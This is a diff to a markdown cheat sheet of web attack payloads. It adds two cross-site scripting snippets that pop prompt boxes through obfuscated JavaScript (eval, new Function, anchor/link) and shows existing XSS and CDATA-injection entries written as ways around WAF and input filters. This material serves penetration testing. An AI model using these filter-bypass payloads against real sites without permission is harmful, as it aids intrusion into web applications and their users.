@@ -10,6 +10,8 @@
 ### Cross Site Scripting
  - `[document.domain].find(confirm)` (helped me to bypass WAFs/filters or useful if input is echoed or used as variable in js files)
  - `['h0nus'].find(window[String.fromCharCode(97,108,101,114,116)])` (pops an alert with h0nus string :) useful for waf bypasses or evade checks)
+ - `('asd').link(eval("var asd=new Function('return prompt(\"h0nus\")'); asd();"))` (pops a prompt with h0nus string )
+ - `('asd').anchor(prompt());` (just pops a prompt) 
 
 ### XML External Entity
  -  `<![CDATA[ <script>prompt(2)</script> ]]>` (Sometimes WAFS block by keywords like DOCTYPE, ENTITY & ect, but you can inject into `<![CDATA[X]]>` )
